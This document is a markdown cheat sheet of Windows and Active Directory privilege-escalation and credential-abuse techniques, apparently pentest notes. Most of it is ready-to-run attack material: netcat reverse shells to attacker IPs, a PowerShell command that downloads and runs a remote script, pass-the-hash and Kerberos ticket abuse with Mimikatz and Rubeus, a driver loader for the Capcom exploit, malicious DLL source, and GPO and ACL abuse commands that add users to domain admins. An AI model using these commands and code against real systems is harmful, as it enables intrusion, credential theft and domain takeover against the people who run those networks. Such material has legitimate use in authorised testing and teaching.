
# Exploit Sensitive data
## Passwords reuse
### cmdkey
```
runas /savecred /user:ACCESS\\Administrator "c:\\windows\\system32\\cmd.exe /c \\\IP\\share\\nc.exe -nv 10.10.14.2 80 -e cmd.exe"  
```
## Passwords in Registry
### SAM / LSA secrets
#### Bruteforce hash
Crack the LM hashes (if any) using [Ophcrack](http://ophcrack.sourceforge.net/).  
Crack the NT hashes using [JtR](http://www.openwall.com/john/)or [hashcat](http://hashcat.net/).
```
hashcat -m2100 '$DCC2$10240#spot#3407de6ff2f044ab21711a394d85f3b8' /usr/share/wordlists/rockyou.txt --force --potfile-disable
```
#### Pass the Hash
Use the NTLM hash to authenticate 
```
wce.exe -s john-pc:securus:aad3b435b51404eeaad3b435b51404ee:2fb3672702973ac1b9ade0acbdab432f

pth-winexe -U john-pc$%aad3b435b51404eeaad3b435b51404ee:2fb3672702973ac1b9ade0acbdab432f --uninstall //10.11.0.22 cmd

pth-net rpc user -U 'securus\john-pc$%aad3b435b51404eeaad3b435b51404ee:2fb3672702973ac1b9ade0acbdab432f' -S dc1.securus.corp.com
```
#### Over pass the hass / pass the key
Generate Kerberos TGT from hashes (or AES keys)
```
#With Mimikat
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:domain.local /rc4:<nthash> /run:powershell.exe"'
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:domain.local /aes256:<aes_key> /run:powershell.exe"'

#With Rubeus
.\Rubeus.exe asktgt /domain:domain.local /user:Administrator /rc4:<nthash> /ptt /opsec
.\Rubeus.exe asktgt /domain:domain.local /user:Administrator /aes256:<aes_key> /ptt /opsec
```
### Domain Controllers

# Exploit Misconfigurations

## Privileges 
### SeCreateToken
This token **can be used** as EoP method **only** if the user **can impersonate** tokens (even without SeImpersonatePrivilege). In a possible scenario, a user can impersonate the token if it is for the same user and the integrity level is less or equal to the current process integrity level. In this case, the user could **create an impersonation token** and add to it a privileged group SID.
### SeLoadDriver
#### Capcom
Upload the capcom.sys binary on the victim system. Compile and run the code above  to get it loaded onto the system (Modify lines 55 and 56):
```
#include   "stdafx.h"
#include   &lt;windows.h&gt;
#include   &lt;stdio.h&gt;
#include   &lt;ntsecapi.h&gt;
#include   &lt;stdlib.h&gt;
#include   &lt;locale.h&gt;
#include   &lt;iostream&gt;
#include   "stdafx.h"

NTSTATUS(NTAPI *NtLoadDriver)(IN PUNICODE_STRING DriverServiceName);
VOID(NTAPI *RtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
NTSTATUS(NTAPI *NtUnloadDriver)(IN PUNICODE_STRING DriverServiceName);

int   main()
{
     TOKEN_PRIVILEGES tp;
     LUID luid;
     bool   bEnablePrivilege(true);
     HANDLE hToken(NULL);
     OpenProcessToken(GetCurrentProcess(), TOKEN\_ADJUST\_PRIVILEGES | TOKEN_QUERY,   &hToken);
     if   (!LookupPrivilegeValue(
         NULL,   // lookup privilege on local system
         L"SeLoadDriverPrivilege",   // privilege to lookup
         &luid))   // receives LUID of privilege
     {
         printf("LookupPrivilegeValue error: %un",   GetLastError());
         return FALSE;
     }
     tp.PrivilegeCount =   1;
     tp.Privileges\[0\].Luid = luid;
     if   (bEnablePrivilege)   {
         tp.Privileges\[0\].Attributes = SE\_PRIVILEGE\_ENABLED;
     }
     // Enable the privilege or disable all privileges.
     if   (!AdjustTokenPrivileges(
        hToken,
        FALSE,
         &tp,
         sizeof(TOKEN_PRIVILEGES),
         (PTOKEN_PRIVILEGES)NULL,
         (PDWORD)NULL))
     {
         printf("AdjustTokenPrivileges error: %x",   GetLastError());
         return FALSE;
     }

     //system("cmd");
     // below code for loading drivers is taken from https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/RDI/dll/NtLoadDriver.h
    std::cout <<   "\[+\] Set Registry Keys"   << std::endl;
    NTSTATUS st1;
    UNICODE_STRING pPath;
    UNICODE_STRING pPathReg;
    PCWSTR pPathSource = L"C:\\\experiments\\\privileges\\\Capcom.sys";
    PCWSTR pPathSourceReg = L"\\\registry\\\machine\\\System\\\CurrentControlSet\\\Services\\\SomeService";
    const   char NTDLL\[\]   =   {   0x6e,   0x74,   0x64,   0x6c,   0x6c,   0x2e,   0x64,   0x6c,   0x6c,   0x00   };
    HMODULE hObsolete =   GetModuleHandleA(NTDLL);
    *(FARPROC *)&RtlInitUnicodeString =   GetProcAddress(hObsolete,   "RtlInitUnicodeString");
    *(FARPROC *)&NtLoadDriver =   GetProcAddress(hObsolete,   "NtLoadDriver");
    *(FARPROC *)&NtUnloadDriver =   GetProcAddress(hObsolete,   "NtUnloadDriver");
    
    RtlInitUnicodeString(&pPath, pPathSource);
    RtlInitUnicodeString(&pPathReg, pPathSourceReg);
    st1 =   NtLoadDriver(&pPathReg);
    std::cout <<   "\[+\] value of st1: "   << st1 <<   "\\n";
    if   (st1 == ERROR_SUCCESS)   {
        std::cout <<   "\[+\] Driver Loaded as Kernel..\\n";
        std::cout <<   "\[+\] Press \[ENTER\] to unload driver\\n";
     }
     
    getchar();
    st1 =   NtUnloadDriver(&pPathReg);
    if   (st1 == ERROR_SUCCESS)   {
        std::cout <<   "\[+\] Driver unloaded from Kernel..\\n";
        std::cout <<   "\[+\] Press \[ENTER\] to exit\\n";
        getchar();
    }
    return   0;
}
```
We can now download and compile the Capcom exploit from https://github.com/tandasat/ExploitCapcom and execute it on the system to elevate our privileges to `NT Authority\System`.
### SeRestore
**Write access** control to any file on the system, regardless of the files ACL. You can **modify services**, DLL Hijacking, set **debugger** (Image File Execution Options)… A lot of options to escalate.
### SeTcb 
If you have enabled this token you can use **KERB_S4U_LOGON** to get an **impersonation token** for any other user without knowing the credentials, **add an arbitrary group** (admins) to the token, set the **integrity level** of the token to "**medium**", and assign this token to the **current thread** (SetThreadToken).
### SeImpersonate and\or SeAssignPrimaryToken
Technique often used to escalate privileges from `Windows Service Accounts` to `NT AUTHORITY/SYSTEM`.
Cours:
[Potatoes - Windows Privilege Escalation · Jorge Lajara Website (jlajara.gitlab.io)](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
Other tools (Empire, etc.):
[Token Impersonation - Pentest Everything (gitbook.io)](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/access-token-manipultion/token-impersonation)
C++ exploit code: 
[Primary Access Token Manipulation - Red Teaming Experiments (ired.team)](https://www.ired.team/offensive-security/privilege-escalation/t1134-access-token-manipulation)
[SeImpersonate from High To System - HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/seimpersonate-from-high-to-system)
[SeDebug + SeImpersonate copy token - HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/sedebug-+-seimpersonate-copy-token)

If the machine is **>= Windows 10 1809 & Windows Server 2019** \- Try **Rogue Potato** there are binary tools available at : 
* https://github.com/breenmachine/RottenPotatoNG
* https://github.com/foxglovesec/RottenPotato
```
# metasploit
getuid
getprivs
use incognito
list\_tokens -u
cd c:\temp\
execute -Hc -f ./rot.exe
impersonate\_token "NT AUTHORITY\SYSTEM"

# Powerview
Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\"};"
```
If the machine is **< Windows 10 1809 < Windows Server 2019** \- Try **Juicy Potato**:
* https://github.com/ohpe/juicy-potato
* https://github.com/antonioCoco/JuicyPotatoNG
1.  Select a CLSID based on your Windows version, a CLSID is a globally unique identifier that identifies a COM class object
* Windows 7 Enterprise
* Windows 8.1 Enterprise
* Windows 10 Enterprise
* Windows 10 Professional
* Windows Server 2008 R2 Enterprise
* Windows Server 2012 Datacenter
* Windows Server 2016 Standard
2.  Execute JuicyPotato to run a privileged command.
```
JuicyPotato.exe -l 9999 -p c:\interpub\wwwroot\upload\nc.exe -a "IP PORT -e cmd.exe" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}
JuicyPotato.exe -l 1340 -p C:\users\User\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
JuicyPotato.exe -l 1337 -p c:\Windows\System32\cmd.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -a "/c c:\users\User\reverse_shell.exe"
```
Check: [Windows NamedPipes 101 + Privilege Escalation - Red Teaming Experiments (ired.team)](https://www.ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
[Named Pipe Client Impersonation - HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/named-pipe-client-impersonation)
### SeTakeOwnerShip
```
takeown.exe /f "%windir%\\system32"
icalcs.exe "%windir%\\system32" /grant "%username%":F
```
### SeBackup
Robocopy requires both SeBackup and SeRestore to work with /b parameter.
```
robocopy /b %WINDIR%\\MEMORY.DMP
```
Check also:
* [giuliano108/SeBackupPrivilege: Use SE\_BACKUP\_NAME/SeBackupPrivilege to access objects you shouldn't have access to (github.com)](https://github.com/giuliano108/SeBackupPrivilege)
### AlwaysInstallElevated
```
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```
Otherwise, use PowerUp:
```
Write-UserAddMSI
```
and execute the crated binary to escalate privileges.
## Active process and services 
### Enable service
If you are having this error (for example with SSDPSRV):
```
_System error 1058 has occurred._   _The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._
```
You can enable it using
```
sc config SSDPSRV start= demand
sc config SSDPSRV obj=   ".\\LocalSystem"   password=   ""
```
**Take into account that the service upnphost depends on SSDPSRV to work (for XP SP1)**
**Another workaround** of this problem is running:
```
sc.exe config usosvc start= auto
```
### Restart service
```
wmic service <Service_Name> call startservice
net stop <Service_Name> && net start <Service_Name>
```
### Insecure service permissions
#### Modify binpath (SERVICE_CHANGE_CONFIG)
```
sc config <Service_Name> binpath= "\"C:\PrivEsc\reverse.exe\""
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"
```
### Weak registry permissions 
#### Modify ImagePath (WriteData/AddFile)
```
reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc /v ImagePath /t REG\_EXPAND\_SZ /d C:\\PrivEsc\\reverse.exe /f
```
#### Dll hijacking (AppendData/AddSubdirectory)
Create malicious DLL:
```
  
#include &lt;iostream&gt;
#include &lt;Windows.h&gt;
#include &lt;Lmcons.h&gt; // UNLEN + GetUserName
#include &lt;tlhelp32.h&gt; // CreateToolhelp32Snapshot()
#include &lt;strsafe.h&gt;

extern "C" __declspec(dllexport) DWORD APIENTRY OpenPerfData(LPWSTR pContext);
extern "C" __declspec(dllexport) DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned);
extern "C" __declspec(dllexport) DWORD APIENTRY ClosePerfData();
void Log(LPCWSTR pwszCallingFrom);
void LogToFile(LPCWSTR pwszFilnema, LPWSTR pwszData);

DWORD APIENTRY OpenPerfData(LPWSTR pContext)
{
    Log(L"OpenPerfData");
    return ERROR_SUCCESS;
}

DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned)
{
    Log(L"CollectPerfData");
    return ERROR_SUCCESS;
}

DWORD APIENTRY ClosePerfData()
{
    Log(L"ClosePerfData");
    return ERROR_SUCCESS;
}

void Log(LPCWSTR pwszCallingFrom)
{
    LPWSTR pwszBuffer, pwszCommandLine;
    WCHAR wszUsername\[UNLEN + 1\] = { 0 };
    SYSTEMTIME st = { 0 };
    HANDLE hToolhelpSnapshot;
    PROCESSENTRY32 stProcessEntry = { 0 };
    DWORD dwPcbBuffer = UNLEN, dwBytesWritten = 0, dwProcessId = 0, dwParentProcessId = 0, dwBufSize = 0;
    BOOL bResult = FALSE;

    // Get the command line of the current process
    pwszCommandLine = GetCommandLine();

    // Get the name of the process owner
    GetUserName(wszUsername, &dwPcbBuffer);

    // Get the PID of the current process
    dwProcessId = GetCurrentProcessId();

    // Get the PID of the parent process
    hToolhelpSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    stProcessEntry.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hToolhelpSnapshot, &stProcessEntry)) {
        do {
            if (stProcessEntry.th32ProcessID == dwProcessId) {
                dwParentProcessId = stProcessEntry.th32ParentProcessID;
                break;
            }
        } while (Process32Next(hToolhelpSnapshot, &stProcessEntry));
    }
    CloseHandle(hToolhelpSnapshot);

    // Get the current date and time
    GetLocalTime(&st);

    // Prepare the output string and log the result
    dwBufSize = 4096 * sizeof(WCHAR);
    pwszBuffer = (LPWSTR)malloc(dwBufSize);
    if (pwszBuffer)
    {
        StringCchPrintf(pwszBuffer, dwBufSize, L"\[%.2u:%.2u:%.2u\] - PID=%d - PPID=%d - USER='%s' - CMD='%s' - METHOD='%s'\\r\\n",
            st.wHour,
            st.wMinute,
            st.wSecond,
            dwProcessId,
            dwParentProcessId,
            wszUsername,
            pwszCommandLine,
            pwszCallingFrom
        );

        LogToFile(L"C:\\\LOGS\\\RpcEptMapperPoc.log", pwszBuffer);

        free(pwszBuffer);
    }
}

void LogToFile(LPCWSTR pwszFilename, LPWSTR pwszData)
{
    HANDLE hFile;
    DWORD dwBytesWritten;
    
    hFile= CreateFile(pwszFilename, FILE\_APPEND\_DATA, 0, NULL, OPEN\_ALWAYS, FILE\_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID\_HANDLE\_VALUE)
    {
        WriteFile(hFile, pwszData, (DWORD)wcslen(pwszData) * sizeof(WCHAR), &dwBytesWritten, NULL);
        CloseHandle(hFile);
    }
}

extern "C" BOOL WINAPI DllMain(HINSTANCE const instance, DWORD const reason, LPVOID const reserved)
{
    switch (reason)
    {
    case DLL\_PROCESS\_ATTACH:
        Log(L"DllMain");
        break;
    case DLL\_THREAD\_ATTACH:
        break;
    case DLL\_THREAD\_DETACH:
        break;
    case DLL\_PROCESS\_DETACH:
        break;
    }
    return TRUE;
}
```
In Visual Studio, create a new “_C++ Console App_” project. 
Select **_Release/x64_** and “**_Build the solution_**”. This will produce our DLL file: `.\DllRpcEndpointMapperPoc\x64\Release\DllRpcEndpointMapperPoc.dll`.

Test the DLL:
```
rundll32 DllRpcEndpointMapperPoc.dll,OpenPerfData
```
Use this script to create the appropriate key and values, wait for user input and terminate by cleaning everything up:
```
$ServiceKey = "SYSTEM\CurrentControlSet\Services\RpcEptMapper\Performance"

Write-Host "[*] Create 'Performance' subkey"
[void] [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey($ServiceKey)
Write-Host "[*] Create 'Library' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Library" -Value "$($pwd)\DllRpcEndpointMapperPoc.dll" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Open' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Open" -Value "OpenPerfData" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Collect' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Collect" -Value "CollectPerfData" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Close' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Close" -Value "ClosePerfData" -PropertyType "String" -Force | Out-Null

Read-Host -Prompt "Press any key to continue"

Write-Host "[*] Cleanup"
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Library" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Open" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Collect" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Close" -Force
[Microsoft.Win32.Registry]::LocalMachine.DeleteSubKey($ServiceKey)
```
Finally, you can query Perfomance Counters_ using WMI (_Windows Management Instrumentation_) to trick the RPC Endpoint Mapper service into loading our Performace DLL. More info here: [_WMI Performance Counter Types_](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-performance-counter-types).
```
Get-WmiObject -List | Where-Object { $_.Name -Like "Win32_Perf*" }
```
### Unquoted Service Path 
```
1\. Place Unquoted.exe in ‘C:\\Program Files\\Unquoted Path Service’.
2\. Open command prompt and type: sc start unquotedsvc
```
### DLL Hijacking
Compile a malicious dll:
```
- For x64 compile with: "x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll"
- For x86 compile with: "i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll"
```
Content of windows_dll.c:
```
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k whoami > C:\\Windows\\Temp\\dll.txt");
        ExitProcess(0);
    }
    return TRUE;
}
```
Import the malicious DLL in a PATH directory, the service binary directory or your current directory if the DLL is not found and restart the service.
## GPO
### Weak GPO permissions
Create immediate scheduled task through GPO:
```
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
## Printers 
https://pentestlab.blog/tag/privilege-escalation/page/3/  

Create a printer :
```
$printerName     = 'Universal Priv Printer'
$system32        = $env:systemroot + '\system32'
$drivers         = $system32 + '\spool\drivers'
$RegStartPrinter = 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\' + $printerName
 
Copy-Item -Force -Path ($system32 + '\mscms.dll')             -Destination ($system32 + '\mimispool.dll')
Copy-Item -Force -Path '.\mimikatz_trunk\x64\mimispool.dll'   -Destination ($drivers  + '\x64\3\mimispool.dll')
Copy-Item -Force -Path '.\mimikatz_trunk\win32\mimispool.dll' -Destination ($drivers  + '\W32X86\3\mimispool.dll')
 
Add-PrinterDriver -Name       'Generic / Text Only'
Add-Printer       -DriverName 'Generic / Text Only' -Name $printerName -PortName 'FILE:' -Shared
 
New-Item         -Path ($RegStartPrinter + '\CopyFiles')        | Out-Null
New-Item         -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Directory' -PropertyType 'String'      -Value 'x64\3'           | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Files'     -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Module'    -PropertyType 'String'      -Value 'mscms.dll'       | Out-Null
New-Item         -Path ($RegStartPrinter + '\CopyFiles\Litchi') | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Directory' -PropertyType 'String'      -Value 'W32X86\3'        | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Files'     -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Module'    -PropertyType 'String'      -Value 'mscms.dll'       | Out-Null
New-Item         -Path ($RegStartPrinter + '\CopyFiles\Mango')  | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Directory' -PropertyType 'String'      -Value $null             | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Files'     -PropertyType 'MultiString' -Value $null             | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Module'    -PropertyType 'String'      -Value 'mimispool.dll'   | Out-Null
```
Execute the driver:
```
$serverName  = 'dc.purple.lab'
$printerName = 'Universal Priv Printer'
$fullprinterName = '\\' + $serverName + '\' + $printerName + ' - ' + $(If ([System.Environment]::Is64BitOperatingSystem) {'x64'} Else {'x86'})
Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue
Add-Printer -ConnectionName $fullprinterName
```
## Active directory
### Kerberoasting
Bruteforce password of the ticket:
```
python2 tgsrepcrack.py pwd kerberoast.bin
```
### AS-REP Roasting
Bruteforce the hash below:
```
$krb5asrep$spot@offense.local:3171EA207B3A6FDAEE52BA247C20362E$56FE7DC0CABA8CB7D3A02A140C612A917DF3343C01BCDAB0B669EFA15B29B2AEBBFED2B4F3368A897B833A6B95D5C2F1C2477121C8F5E005AA2A588C5AE72AADFCBF1AEDD8B7AC2F2E94E94CB101E27A2E9906E8646919815D90B4186367B6D5072AB9EDD0D7B85519FBE33997B3D3B378340E3F64CAA92595523B0AD8DC8E0ABE69DDA178D8BA487D3632A52BE7FF4E786F4C271172797DCBBDED86020405B014278D5556D8382A655A6DB1787DBE949B412756C43841C601CE5F21A36A0536CFED53C913C3620062FDF5B18259EA35DE2B90C403FBADD185C0F54B8D0249972903CA8FF5951A866FC70379B9DA
```
Insert `23` after ther `$krb5asrep$`:
```
$krb5asrep$23$spot@offense.local:3171ea207b3a6fdaee52ba247c20362e$56fe7dc0caba8cb7d3a02a140c612a917df3343c01bcdab0b669efa15b29b2aebbfed2b4f3368a897b833a6b95d5c2f1c2477121c8f5e005aa2a588c5ae72aadfcbf1aedd8b7ac2f2e94e94cb101e27a2e9906e8646919815d90b4186367b6d5072ab9edd0d7b85519fbe33997b3d3b378340e3f64caa92595523b0ad8dc8e0abe69dda178d8ba487d3632a52be7ff4e786f4c271172797dcbbded86020405b014278d5556d8382a655a6db1787dbe949b412756c43841c601ce5f21a36a0536cfed53c913c3620062fdf5b18259ea35de2b90c403fbadd185c0f54b8d0249972903ca8ff5951a866fc70379b9da
```
crack it using hashcat:
```
hashcat -m18200 '$krb5asrep$23$spot@offense.local:3171EA207B3A6FDAEE52BA247C20362E$56FE7DC0CABA8CB7D3A02A140C612A917DF3343C01BCDAB0B669EFA15B29B2AEBBFED2B4F3368A897B833A6B95D5C2F1C2477121C8F5E005AA2A588C5AE72AADFCBF1AEDD8B7AC2F2E94E94CB101E27A2E9906E8646919815D90B4186367B6D5072AB9EDD0D7B85519FBE33997B3D3B378340E3F64CAA92595523B0AD8DC8E0ABE69DDA178D8BA487D3632A52BE7FF4E786F4C271172797DCBBDED86020405B014278D5556D8382A655A6DB1787DBE949B412756C43841C601CE5F21A36A0536CFED53C913C3620062FDF5B18259EA35DE2B90C403FBADD185C0F54B8D0249972903CA8FF5951A866FC70379B9DA' -a 3 /usr/share/wordlists/rockyou.txt
```
### DNSAdmins abuse
If a user is a member of the DNSAdmins group, he can possibly load an arbitary DLL with the privileges of dns.exe that runs as SYSTEM. In case the DC serves a DNS, the user can escalate his privileges to DA. This exploitation process needs privileges to restart the DNS service to work.
1.  Enumerate the members of the DNSAdmins group:
    * PowerView: `Get-NetGroupMember -GroupName "DNSAdmins"`
    * AD Module: `Get-ADGroupMember -Identiny DNSAdmins`
2.  Once we found a member of this group we need to compromise it (There are many ways).
3.  Then by serving a malicious DLL on a SMB share and configuring the dll usage,we can escalate our privileges:
```
#Using dnscmd:
dnscmd <NameOfDNSMAchine> /config /serverlevelplugindll \\Path\To\Our\Dll\malicious.dll

#Restart the DNS Service:
sc \\DNSServer stop dns
sc \\DNSServer start dns
```
### ACLs
#### GenericAll
On group:
```
net group "domain admins" username /add /domain
```
If you have GenericAll, GenericWrite or Write privilege on a Computer object, you can pull [Kerberos Resource-based Constrained Delegation: Computer Object Take Over](/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution) off.

#### WriteProperty / Self (All/Self-Membership)
`Self`  or `WriteProperty` right on `Self-Membership` objects for **a group**, give the ability to add ourselves to the group and escalate privileges:
```
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
net user spotless /domain
```
`WriteProperty` right on **a user**:
* ShadowCredentials
```
Whisker.exe add /target:<target> /domain:domain.local /dc:dc.domain.local /path:C:\path\to\file.pfx /password:"Password123!"
```
* Logon Script
```
#PowerView
Set-DomainObject <target> -Set @{'mstsinitialprogram'='\\ATTACKER_IP\rev.exe'} -Verbose

#AD module
Set-ADObject -SamAccountName '<target>' -PropertyName scriptpath -PropertyValue "\\ATTACKER_IP\rev.exe"
```
`WriteProperty` right on **a computer**:
* ShadowCredentials
```
Whisker.exe add /target:<target> /domain:domain.local /dc:dc.domain.local /path:C:\path\to\file.pfx /password:"Password123!"
```
`WriteProperty` right on **a GPO**, we can create an "evil" GPO with a scheduled task for example
```
#With PowerView
New-GPOImmediateTask -Verbose -Force -TaskName 'Update' -GPODisplayName 'weakGPO' -Command cmd -CommandArguments "/c net localgroup administrators user1 /add"

#With SharpGPOAbuse
./SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author Administrator --Command "cmd.exe" --Arguments "/c /tmp/nc.exe attacker_ip 4545 -e powershell" --GPOName "weakGPO"
```
`WriteProperty` right on an OU + `CreateChild` pn policies:
```
#With RSAT module
New-GPO -Name "New GPO" | New-GPLink -Target "OU=Workstation,DC=domain,DC=local"
Set-GPPrefRegistryValue -Name "New GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /C \\path\to\payload" -Type ExpandString
```
### WriteOwner (All)
With this rights on a user it is possible to become the "owner" (**Grant Ownership**) of the account and then change our ACLs against it. Note that the SID specified with `-Identity` is the SID of the targeted user:
```
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "username" -Verbose
Add-ObjectAcl -TargetIdentity S-1-5-21-2552734371-813931464-1050690807-512 -PrincipalIdentity username -Rights ResetPassword

#And change the password
$cred = ConvertTo-SecureString "Password123!" -AsPlainText -force                  
Set-DomainUserPassword -Identity <target> -accountpassword $cred
```
### GenericWrite (Script-Path)
`WriteProperty` on an `ObjectType`, which in this particular case is `Script-Path`, allows the attacker to overwrite the logon script path of the `delegate` user, which means that the next time, when the user `delegate` logs on, their system will execute our malicious script:
```
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
### ExtendedRight (User-Force-Change-Password)
Change password with powerview:
```
Set-DomainUserPassword -Identity username -Verbose

# one-liner
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
### WriteDACL
Can give yourself `GenericAll` privileges:
```
Add-ObjectAcl -TargetIdentity <target> -PrincipalIdentity username -Rights All
```
### Unconstrained delegation
Use a compromised priviliged account and add TGT into current logon sessions:
```
# Powerview
Invoke-Mimikatz -Command '"kerberos::ptt <PathToTicket>"'
```
Check if the ticket is added:
```
klist tickets
```
Connect to other computers:
```
Enter-PSSession dc01
```
### Constrained delegation
Add TGS into current logon sessions:
```
# Powerview
Invoke-Mimikatz -Command '"kerberos::ptt <PathToTGS>"'

# Rubeus
.\Rubeus.exe ptt /ticket:<Base64Ticket>
```
Execute commands on other services on behalf of the targeted user:
```
# Rubeus 
Rubeus.exe s4u /user:<UserName> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<UserToImpersonate> /msdsspn:"<Service's SPN>" /altservice:<Optional> /ptt

# PsExec
.\PsExec.exe -accepteula \\<IP/Hostname> cmd
```
Kerberos tickets extracted from Windows needs to be converted to `.Ccache` format for use within Linux.
```
python3 rubeustoccache.py <Base64Ticket> <Output.kirbi> <Output.ccache>
```
Export the ticket to the Kerberos environmental variable:
```
export KRB5CCNAME=ticket.ccache
```
Once exported we can use `impacket` with the `-k` and `-no-pass` parameter to execute commands on the target Domain Controller.
```
psexec.py security.local/moe@DC01.security.local -k -no-pass
smbexec.py security.local/moe@DC01.security.local -k -no-pass
wmiexec.py security.local/moe@DC01.security.local -k -no-pass
```
Other exploitattion example with machine account TGS (for full access on targeted computers):
```
#Import Powermad and use it to create a new MACHINE ACCOUNT
..\Powermad.ps1
New-MachineAccount -MachineAccount <MachineAccountName> -Password $(ConvertTo-SecureString 'p@ssword!' -AsPlainText -Force) -Verbose

#Import PowerView and get the SID of our new created machine account
..\PowerView.ps1
$ComputerSid = Get-DomainComputer <MachineAccountName> -Properties objectsid | Select -Expand objectsid

#Then by using the SID we are going to build an ACE for the new created machine account using a raw security descriptor:
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength) 
$SD.GetBinaryForm($SDBytes, 0)

#Next, we need to set the security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView
Get-DomainComputer TargetMachine | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose

#After that we need to get the RC4 hash of the new machine account's password using Rubeus
Rubeus.exe hash /password:'p@ssword!'

#And for this example, we are going to impersonate Domain Administrator on the cifs service of the target computer using Rubeus
Rubeus.exe s4u /user:<MachineAccountName> /rc4:<RC4HashOfMachineAccountPassword> /impersonateuser:Administrator /msdsspn:cifs/TargetMachine.wtver.domain /domain:wtver.domain /ptt

#Finally we can access the C$ drive of the target machine
dir \\TargetMachine.wtver.domain\C$
```
# Forets
## SID filtering
